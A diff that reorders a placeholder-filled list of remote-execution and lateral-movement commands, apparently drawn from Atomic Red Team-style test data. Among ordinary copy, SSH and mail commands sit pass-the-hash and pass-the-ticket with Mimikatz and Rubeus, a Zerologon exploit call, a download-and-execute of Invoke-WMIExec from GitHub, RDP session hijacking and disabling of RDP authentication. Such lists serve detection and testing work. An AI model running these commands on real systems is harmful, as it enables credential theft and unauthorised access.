@@ -1,110 +1,113 @@
-Start-BitsTransfer -Source ${source_file_path} -Destination ${Destination_file_path}
-rsync -avz ${source_file_path} ${media_file_path}
-$RemovableDrives=@();$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID;ForEach ($Drive in $RemovableDrives);{;write-host "Removable Drive Found:" $Drive;New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives.";}
-cp -r ${source_file_path} ${share_file_path}
-psexec \\${ip_address} -i -u ${username} -p ${password} ${command}
-plink -ssh ${ip_address} -l ${username} -pw ${password}
-sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet
-sendmail ${username}@${domain} < mail.txt
-putty ${username}@${ip_address}
-xcopy ${source_file_path} ${media_file_path} /s /e
-termius username@hostname
-NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK;copy '#{local_file}' '*:\'
-mstsc /v:${ip_address} /f
-cat email.txt | sendmail ${username}@${domain}
-kerberos::ptt ticket.kirbi
-xcopy ${source_file_path} ${media_file_path}
-iwr -URI ${remote_file} -Outfile ${local_path}
-ssmtp ${username}@${domain} < mail.txt
-copy \\${Source_IP}\${source_file_path} \\${Destination_IP}\${Destination_file_path}
-start "C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe" ${remote_file}
-ssh ${user}@${ip}
-sekurlsa::pth /user:${username} /Domain:${domain} /ntlm:${ntlm}
-Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false ;Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass};Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq "TSM-SSH" } | Start-VMHostService -Confirm:$false
-Rubeus.exe ptt /ticket:ticket.kirbi
-psexec \\${ip_address} -i -u ${username} -p ${password} ${command} -s
-robocopy ${source_file_path}  ${media_file_path} /e /copyall /mir
-"%PROGRAMFILES(x86)%/#{radmin_exe}"
-python ./cve-2020-1472-exploit.py -n ${dc_name} -t ${dc_ip}
-scp ${local_file} ${username}@${remote_host}:${remote_path}
-MsoHtmEd.exe ${remote_file}
-cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"
-Enable-PSRemoting -Force;Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
-sekurlsa::pth /user:${username} /Domain:${domain} /ntlm:${ntlm} /run:"PsExec.exe \\${ip_address} ${process}"
-(New-Object System.Net.WebClient).DownloadFile("${remote_file}", "${local_path}")
-evil-winrm -i #{destination_address} -u #{user_name} -p #{password}
-bitsadmin.exe /transfer ${bits_job_name} /Priority HIGH ${remote_file} ${local_path}
-copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe';$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","#{computer_name}"));$com.ActivateMicrosoftApp("5")
-robocopy ${source_file_path} ${media_file_path} /e
-putty -ssh ${ip_address} -l ${username} -pw ${password} -m script.txt
-xcopy ${source_file_path} \\${Destination_IP}\${Destination_file_path} /Y
-cat email.txt | mutt -s ${email_subject} ${username}@${domain}
-Copy-Item ${source_file_path} -Destination ${media_file_path} -Recurse
-xcopy ${source_file_path} ${share_file_path}
-scp ${source_file_path} ${username}@${ip_address}:${media_file_path}
-New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
-ProtocolHandler.exe ${remote_file}
-robocopy ${source_file_path} ${media_file_path} /e /xo
-Invoke-WebRequest -URI ${remote_file} -Outfile ${local_path}
-xcopy ${source_file_path} ${share_file_path} /s /e
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
-putty -ssh ${username}@${ip_address} -pw ${password} -m script.txt
-scp ${source_file_path} ${username}@${ip_address}:${share_file_path}
-robocopy ${source_file_path} ${share_file_path} /e /xo
-vncviewer ${ip_address}
-cp -r ${source_file_path} ${media_file_path}
-scp ${username}@${remote_host}:${remote_file} ${local_path}
-Copy-Item ${source_file_path} -Destination ${share_file_path} -Recurse
-"#{psexec_exe}" #{remote_host} -accepteula -c #{command_path}
-cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1
-cat email.txt | mpack -s ${email_subject} ${username}@${domain}
-xcopy ${source_file_path} \\${Destination_IP}\${Destination_file_path}
-robocopy ${source_file_path} ${share_file_path}  /mir
-copy ${source_file_path} ${share_file_path}
-"#{mimikatz_exe}" "kerberos::ptt #{ticket}"
-psexec \\${ip_address} -i ${command}
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
-xfreerdp /v:${ip_address}
-certutil -urlcache -split -f ${remote_file} ${local_path}
-mail -s ${email_subject} ${username}@${domain} < mail.txt
-robocopy ${source_file_path} ${share_file_path} /e /copyall
-Invoke-WMIExec -Target ${ip_address} -Domain ${domain} -Username ${username} -Hash ${ntlm} -Command ${command} -verbose
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
-psexec \\${ip_address} -u ${username} -p ${password} script.txt
-sftp ${username}@{ip_address}
-certreq.exe -Post -config ${remote_file} c:\windows\win.ini ${local_path}
-xfreerdp /u:${username} /p:${password} /v:${ip_address}
-#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
-CertReq -Post -config ${remote_destination} ${local_path}
-pscp ${source_file_path} ${username}@${ip_address}:${share_file_path}
-copy ${source_file_path} ${media_file_path}
-Copy-Item ${source_file_path} -Destination ${media_file_path} -Recurse -Container
-rsync -avz ${source_file_path} ${share_file_path}
-Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port};New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
-powershell.exe iwr -URI ${remote_file} -Outfile ${local_path}
-Copy-Item ${source_file_path} -Destination ${share_file_path}
 New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck;copy '#{local_file}' 'Z:\'
-reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f;netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
-putty -ssh ${username}@${ip_address} -pw ${password}
+query user;sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}";net start sesshijack
+xcopy ${source_file_path} ${share_file_path}
+cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"
+psexec \\${ip_address} -i -u ${username} -p ${password} ${command} -s
+Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false ;Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass};Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq "TSM-SSH" } | Start-VMHostService -Confirm:$false
+vncviewer ${ip_address}
+putty -ssh ${ip_address} -l ${username} -pw ${password}
+plink -ssh ${ip_address} -l ${username} -pw ${password}
+pscp ${local_path}${username}@${remote_host}:${remote_file}
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
+iwr -URI ${remote_file} -Outfile ${local_path}
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f
-Copy-Item ${source_file_path} -Destination "\\${Destination_IP}\C$\${Destination_file_path}" -Recurse -Credential ${password}
+pscp ${source_file_path} ${username}@${ip_address}:${share_file_path}
+robocopy ${source_file_path} ${media_file_path}  /mir
+cat email.txt | mpack -s ${email_subject} ${username}@${domain}
+robocopy ${source_file_path} ${share_file_path} /e /xo
+mail -s ${email_subject} ${username}@${domain} < mail.txt
+putty -ssh ${ip_address} -l ${username} -pw ${password} -m script.txt
+psexec \\${ip_address} -i ${command}
+#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
+robocopy ${source_file_path}  ${media_file_path} /e /copyall /mir
+rsync -avz ${source_file_path} ${share_file_path}
+New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
+echo ${email_content} | sendmail ${username}@${domain}
+putty ${username}@${ip_address}
+sc.exe create sesshijack binpath= "cmd.exe /k tscon ${Session_ID} /dest:${Destination_ID}"
 Enable-PSRemoting -Force
 powershell.exe Invoke-WebRequest -URI ${remote_file} -Outfile ${local_path}
-#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
-& "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi;Set-Location "PathToAtomicsFolder\..\ExternalPayloads";Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi;Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local";& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt;Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi";& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge      
-$Server=#{logonserver};$User = Join-Path #{domain} #{username};$Password="#{password}";cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password;mstsc /v:$Server;echo "RDP connection established"
-[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
-robocopy ${source_file_path}  ${share_file_path} /e /copyall /mir
-Copy-Item ${source_file_path} -Destination ${media_file_path}
-robocopy ${source_file_path} ${media_file_path} /e /copyall
+scp ${username}@${remote_host}:${remote_file} ${local_path}
 robocopy ${source_file_path} ${share_file_path} /e
-pscp ${local_path}${username}@${remote_host}:${remote_file}
+scp ${source_file_path} ${username}@${ip_address}:${media_file_path}
+copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe';$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","#{computer_name}"));$com.ActivateMicrosoftApp("5")
+xcopy ${source_file_path} \\${Destination_IP}\${Destination_file_path}
+xcopy ${source_file_path} \\${Destination_IP}\${Destination_file_path} /Y
+(New-Object System.Net.WebClient).DownloadFile("${remote_file}", "${local_path}")
+certutil -urlcache -split -f ${remote_file} ${local_path}
+copy ${source_file_path} ${share_file_path}
+start "C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe" ${remote_file}
+termius username@hostname
+[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
+scp ${local_file} ${username}@${remote_host}:${remote_path}
+psexec \\${ip_address} -i -u ${username} -p ${password} ${command}
+"#{mimikatz_exe}" "kerberos::ptt #{ticket}"
+ssh ${user}@${ip}
+cp -r ${source_file_path} ${media_file_path}
+sudo SSH_AUTH_SOCK=${sock_value} ssh ${hijack_user_name}@localhost
+rsync -avz ${source_file_path} ${media_file_path}
+cat email.txt | sendmail ${username}@${domain}
+$Server=#{logonserver};$User = Join-Path #{domain} #{username};$Password="#{password}";cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password;mstsc /v:$Server;echo "RDP connection established"
+Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port};New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
+robocopy ${source_file_path}  ${share_file_path} /e /copyall /mir
+sftp ${username}@{ip_address}
+"#{psexec_exe}" #{remote_host} -accepteula -c #{command_path}
+robocopy ${source_file_path} ${media_file_path} /e /xo
+Invoke-WMIExec -Target ${ip_address} -Domain ${domain} -Username ${username} -Hash ${ntlm} -Command ${command} -verbose
+xcopy ${source_file_path} ${media_file_path} /s /e
+#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
+Copy-Item ${source_file_path} -Destination ${media_file_path} -Recurse -Container
+Copy-Item ${source_file_path} -Destination ${share_file_path}
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f;netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
+ProtocolHandler.exe ${remote_file}
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
+Invoke-WebRequest -URI ${remote_file} -Outfile ${local_path}
+certreq.exe -Post -config ${remote_file} c:\windows\win.ini ${local_path}
+scp ${source_file_path} ${username}@${ip_address}:${share_file_path}
+Enable-PSRemoting -Force;Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
+copy ${source_file_path} ${media_file_path}
+$RemovableDrives=@();$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID;ForEach ($Drive in $RemovableDrives);{;write-host "Removable Drive Found:" $Drive;New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives.";}
+putty -ssh ${username}@${ip_address} -pw ${password} -m script.txt
+xfreerdp /u:${username} /p:${password} /v:${ip_address}
+robocopy ${source_file_path} ${media_file_path} /e /copyall
+Start-BitsTransfer -Source ${source_file_path} -Destination ${Destination_file_path}
+Copy-Item ${source_file_path} -Destination ${media_file_path} -Recurse
+Copy-Item ${source_file_path} -Destination "\\${Destination_IP}\C$\${Destination_file_path}" -Recurse -Credential ${password}
 echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
-plink ${username}@${ip_address}
-echo ${email_content} | sendmail ${username}@${domain}
+ssmtp ${username}@${domain} < mail.txt
+putty -ssh ${username}@${ip_address} -pw ${password}
+Rubeus.exe ptt /ticket:ticket.kirbi
+& "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi;Set-Location "PathToAtomicsFolder\..\ExternalPayloads";Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi;Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local";& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt;Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi";& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge      
+Copy-Item ${source_file_path} -Destination ${share_file_path} -Recurse
+powershell.exe iwr -URI ${remote_file} -Outfile ${local_path}
+NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK;copy '#{local_file}' '*:\'
+xcopy ${source_file_path} ${media_file_path}
+Copy-Item ${source_file_path} -Destination ${media_file_path}
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
+cat email.txt | mutt -s ${email_subject} ${username}@${domain}
+cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1
+python ./cve-2020-1472-exploit.py -n ${dc_name} -t ${dc_ip}
+kerberos::ptt ticket.kirbi
+MsoHtmEd.exe ${remote_file}
+psexec \\${ip_address} -u ${username} -p ${password} script.txt
+xcopy ${source_file_path} ${share_file_path} /s /e
 SharpRDP.exe computername=${ip_address} command="${commnad}" username=${domain}\${username} password=${password}
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
+xfreerdp /v:${ip_address}
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
+robocopy ${source_file_path} ${media_file_path} /e
 xcopy ${source_file_path} \\${Destination_IP}\${Destination_file_path} /s
-robocopy ${source_file_path} ${media_file_path}  /mir
-putty -ssh ${ip_address} -l ${username} -pw ${password}
+sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet
+"%PROGRAMFILES(x86)%/#{radmin_exe}"
+sendmail ${username}@${domain} < mail.txt
+CertReq -Post -config ${remote_destination} ${local_path}
+robocopy ${source_file_path} ${share_file_path}  /mir
+evil-winrm -i #{destination_address} -u #{user_name} -p #{password}
+bitsadmin.exe /transfer ${bits_job_name} /Priority HIGH ${remote_file} ${local_path}
+mstsc /v:${ip_address} /f
+sekurlsa::pth /user:${username} /Domain:${domain} /ntlm:${ntlm} /run:"PsExec.exe \\${ip_address} ${process}"
+plink ${username}@${ip_address}
+copy \\${Source_IP}\${source_file_path} \\${Destination_IP}\${Destination_file_path}
+robocopy ${source_file_path} ${share_file_path} /e /copyall
+sekurlsa::pth /user:${username} /Domain:${domain} /ntlm:${ntlm}
+cp -r ${source_file_path} ${share_file_path}
